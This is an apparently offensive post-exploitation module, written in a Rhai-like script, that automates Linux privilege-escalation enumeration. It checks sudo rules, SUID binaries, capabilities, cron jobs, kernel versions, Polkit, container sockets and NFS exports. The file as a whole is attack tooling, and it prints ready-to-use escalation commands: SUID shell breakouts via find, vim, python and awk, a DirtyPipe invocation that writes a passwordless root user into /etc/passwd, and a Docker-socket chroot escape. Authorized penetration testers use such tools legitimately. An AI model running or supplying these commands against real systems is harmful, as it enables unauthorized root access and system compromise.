// @name: privesc_auto
// @description: Automated privilege escalation attempts (use with caution!)
// @category: privesc
// @target_os: linux
// @author: clawsh
// @version: 1.0

let output = "=== Automated Privilege Escalation ===\n";
let attempts = 0;
let success = false;

// --- Current user ---
let whoami = exec_cmd("whoami 2>/dev/null").trim();
if whoami.len() == 0 {
    // Fallback to id -un
    whoami = exec_cmd("id -un 2>/dev/null").trim();
}
if whoami.len() == 0 {
    // Fallback to environment
    whoami = exec_cmd("echo $USER").trim();
}

let is_root = whoami == "root" || exec_cmd("id -u 2>/dev/null").trim() == "0";

if is_root {
    output += "\n\x1b[32m[!] Already running as root!\x1b[0m\n";
    print_output(output);
    let RESULT = "Already root";
    let DATA = #{ already_root: true };
    return;
}

output += "\n\x1b[33mRunning as: " + whoami.trim() + " - attempting escalation...\x1b[0m\n\n";
output += "\x1b[1;31m⚠ WARNING: This module attempts real exploits. Use only on authorized targets!\x1b[0m\n\n";

// --- Check for sudo misconfigurations ---
output += "\x1b[1;4m[Sudo Checks]\x1b[0m\n";

// Sudo -l
let sudo_l = exec_cmd_timeout("sudo -l 2>/dev/null", 10);
if sudo_l.len() > 0 && !sudo_l.contains("not allowed") && !sudo_l.contains("sorry") {
    output += "  \x1b[33mSudo -l output:\x1b[0m\n";
    for line in sudo_l.split("\n").take(15) {
        if line.len() > 0 {
            output += "    " + line + "\n";
        }
    }
    attempts += 1;

    // GTFOBins check
    let gtfobins = ["vim", "vi", "nano", "less", "more", "man", "awk", "find", "git", "python", "python3", "perl", "ruby", "bash", "sh", "env", "ftp", "gdb", "scp", "sftp", "socat", "taskset", "time", "xargs", "cp", "mv", "tar", "zip", "unzip", "rsync", "dd", "head", "tail", "cat", "cut", "sort", "xxd", "base64", "curl", "wget"];

    for gtfo in gtfobins {
        if sudo_l.contains(gtfo) {
            output += "  \x1b[1;31m[!] GTFOBins candidate: " + gtfo + "\x1b[0m\n";
            output += "      Try: sudo " + gtfo + "\n";
        }
    }
}

// NOPASSWD check
let nopasswd = exec_cmd("sudo -l 2>/dev/null | grep -i nopasswd");
if nopasswd.len() > 0 {
    output += "  \x1b[1;31m[!] NOPASSWD detected!\x1b[0m\n";
    for line in nopasswd.split("\n") {
        if line.len() > 0 {
            output += "    " + line + "\n";
        }
    }
}

// --- SUID/SGID binaries ---
output += "\n\x1b[1;4m[SUID/SGID Escalation]\x1b[0m\n";

let suid_bins = exec_cmd_timeout("find / -perm -4000 -type f 2>/dev/null | head -30", 30);
let dangerous_suid = [
    "nmap", "vim", "vi", "nano", "find", "bash", "sh", "cp", "mv", "cat", "more", "less",
    "tail", "head", "gdb", "env", "python", "python3", "perl", "ruby", "php", "awk",
    "csh", "dash", "ksh", "zsh", "tclsh", "git", "scp", "sftp", "ssh", "socat", "taskset"
];

for suid in suid_bins.split("\n") {
    let parts = suid.split("/");
    let bin_name = parts[parts.len() - 1];
    for danger in dangerous_suid {
        if bin_name == danger {
            output += "  \x1b[1;31m[!] Dangerous SUID: " + suid + "\x1b[0m\n";
            if danger == "find" {
                output += "      Try: " + suid + " . -exec /bin/sh -p \\; -quit\n";
            } else if danger == "bash" || danger == "sh" {
                output += "      Try: " + suid + " -p\n";
            } else if danger == "vim" || danger == "vi" {
                output += "      Try: " + suid + " -c ':!/bin/sh'\n";
            } else if danger == "python" || danger == "python3" {
                output += "      Try: " + suid + " -c 'import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")'\n";
            } else if danger == "awk" {
                output += "      Try: " + suid + " 'BEGIN{system(\"/bin/sh -p\")}'\n";
            } else if danger == "env" {
                output += "      Try: " + suid + " /bin/sh -p\n";
            }
            attempts += 1;
        }
    }
}

// --- Capabilities ---
output += "\n\x1b[1;4m[Capabilities Escalation]\x1b[0m\n";

let caps = exec_cmd_timeout("getcap -r / 2>/dev/null | head -20", 30);
let cap_dangerous = ["cap_setuid", "cap_setgid", "cap_sys_admin", "cap_dac_override", "cap_dac_read_search"];

for cap_line in caps.split("\n") {
    for danger_cap in cap_dangerous {
        if cap_line.contains(danger_cap) {
            output += "  \x1b[1;31m[!] Dangerous capability: " + cap_line + "\x1b[0m\n";
            attempts += 1;
        }
    }
}

// --- Writable paths ---
output += "\n\x1b[1;4m[Writable Path Hijacking]\x1b[0m\n";

let path = exec_cmd("echo $PATH 2>/dev/null");
output += "  Current PATH: " + path.trim() + "\n";

for p in path.split(":") {
    let writable = exec_cmd("test -w " + p + " && echo WRITABLE 2>/dev/null");
    if writable.contains("WRITABLE") && p.len() > 0 {
        output += "  \x1b[33m[!] Writable path: " + p + "\x1b[0m\n";
        output += "      Consider hijacking with malicious binary\n";
        attempts += 1;
    }
}

// --- Cron jobs ---
output += "\n\x1b[1;4m[Cron Job Escalation]\x1b[0m\n";

let cron_user = exec_cmd("cat /etc/crontab 2>/dev/null | grep -v '^#' | grep -v '^$'");
let cron_daily = exec_cmd("ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null");

let combined_cron = cron_user + cron_daily;
for line in combined_cron.split("\n") {
    if line.contains("* * * * *") || line.contains("*/1 * * * *") {
        output += "  \x1b[33m[?] Frequent cron: " + line.trim() + "\x1b[0m\n";
    }
    // Check for writable cron scripts
    if line.contains("-rw") && !line.contains("root") {
        output += "  \x1b[1;31m[!] Non-root cron file: " + line.trim() + "\x1b[0m\n";
        attempts += 1;
    }
}

// --- Kernel exploits ---
output += "\n\x1b[1;4m[Kernel Exploit Checks]\x1b[0m\n";

let kernel = exec_cmd("uname -r 2>/dev/null").trim();
output += "  Kernel: " + kernel + "\n";

// Parse kernel version
let parts = kernel.split(".");
let major = parse_int(parts[0]);
let minor = 0;
if parts.len() > 1 {
    minor = parse_int(parts[1].split("-")[0]);
}

// DirtyPipe (5.8 <= kernel < 5.16.11)
if major == 5 && minor >= 8 && minor < 17 {
    output += "  \x1b[1;31m[!] CVE-2022-0847 DirtyPipe likely vulnerable\x1b[0m\n";
    output += "      Compile: gcc dirtypipe.c -o dirtypipe\n";
    output += "      Run: ./dirtypipe /etc/passwd 1 $'root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash\\n'\n";
    attempts += 1;
}

// DirtyCOW (2.6.22 - 4.8.3)
if (major == 2 && minor >= 6) || major == 3 || (major == 4 && minor <= 8) {
    output += "  \x1b[1;31m[!] CVE-2016-5195 DirtyCOW likely vulnerable\x1b[0m\n";
    output += "      Multiple PoCs available on GitHub\n";
    attempts += 1;
}

// --- Polkit/PwnKit ---
output += "\n\x1b[1;4m[Polkit Check]\x1b[0m\n";

let polkit = exec_cmd("pkexec --version 2>/dev/null");
if polkit.len() > 0 {
    output += "  Polkit version: " + polkit.trim() + "\n";
    output += "  \x1b[33m[?] CVE-2021-4034 PwnKit - Try pkexec exploit\x1b[0m\n";
    attempts += 1;
}

// --- Docker escape ---
output += "\n\x1b[1;4m[Container Escape]\x1b[0m\n";

let docker = exec_cmd("ls -la /docker.sock /run/docker.sock 2>/dev/null");
let cgroup = exec_cmd("cat /proc/1/cgroup 2>/dev/null | head -3");

if docker.len() > 0 || cgroup.contains("docker") || cgroup.contains("kubepods") {
    output += "  \x1b[1;31m[!] Running in container!\x1b[0m\n";
    output += "  Cgroup: " + cgroup.trim() + "\n";
    
    if docker.len() > 0 {
        output += "  \x1b[1;31m[!] Docker socket accessible - container escape possible!\x1b[0m\n";
        output += "      docker run -v /:/mnt -it ubuntu chroot /mnt /bin/bash\n";
        attempts += 1;
    }
    
    // Privileged container check
    let cap_proc = exec_cmd("cat /proc/self/status 2>/dev/null | grep CapEff");
    if cap_proc.len() > 0 {
        output += "  " + cap_proc.trim() + "\n";
        // Check for all caps (privileged)
        let cap_decode = exec_cmd("capsh --print 2>/dev/null | head -5");
        if cap_decode.len() > 0 {
            output += "  Capabilities:\n";
            for line in cap_decode.split("\n").take(3) {
                if line.len() > 0 {
                    output += "    " + line + "\n";
                }
            }
        }
    }
}

// --- NFS root squash ---
output += "\n\x1b[1;4m[NFS Check]\x1b[0m\n";

let nfs = exec_cmd("cat /etc/exports 2>/dev/null | grep -v '^#'");
if nfs.len() > 0 {
    for line in nfs.split("\n") {
        if line.len() > 0 && !line.contains("root_squash") {
            output += "  \x1b[1;31m[!] No root_squash: " + line.trim() + "\x1b[0m\n";
            output += "      Mount from another host and write as root\n";
            attempts += 1;
        }
    }
}

// --- LD_PRELOAD/LD_LIBRARY_PATH ---
output += "\n\x1b[1;4m[LD_* Environment]\x1b[0m\n";

let ld_preload = exec_cmd("env 2>/dev/null | grep -E '^LD_'");
if ld_preload.len() > 0 {
    for line in ld_preload.split("\n") {
        if line.len() > 0 {
            output += "  \x1b[33m" + line + "\x1b[0m\n";
        }
    }
}

// Check writable libs
let libs_writable = exec_cmd_timeout("find /lib /usr/lib -writable -type f 2>/dev/null | head -10", 20);
if libs_writable.len() > 0 {
    output += "  \x1b[1;31m[!] Writable shared libraries:\x1b[0m\n";
    for line in libs_writable.split("\n") {
        if line.len() > 0 {
            output += "    " + line + "\n";
        }
    }
    attempts += 1;
}

// --- Summary ---
output += "\n\x1b[1;4m=== Summary ===\x1b[0m\n";
output += "  Escalation vectors found: " + attempts.to_string() + "\n";

if attempts > 0 {
    output += "\n  \x1b[33m⚠ Review findings above and attempt appropriate technique\x1b[0m\n";
    output += "  \x1b[2mTip: Use 'run kernel_exploit' for detailed kernel analysis\x1b[0m\n";
} else {
    output += "\n  No obvious escalation vectors found automatically.\n";
    output += "  Try manual enumeration or 'run linpeas' for deeper analysis.\n";
}

print_output(output);

let RESULT = attempts.to_string() + " escalation vector(s) identified";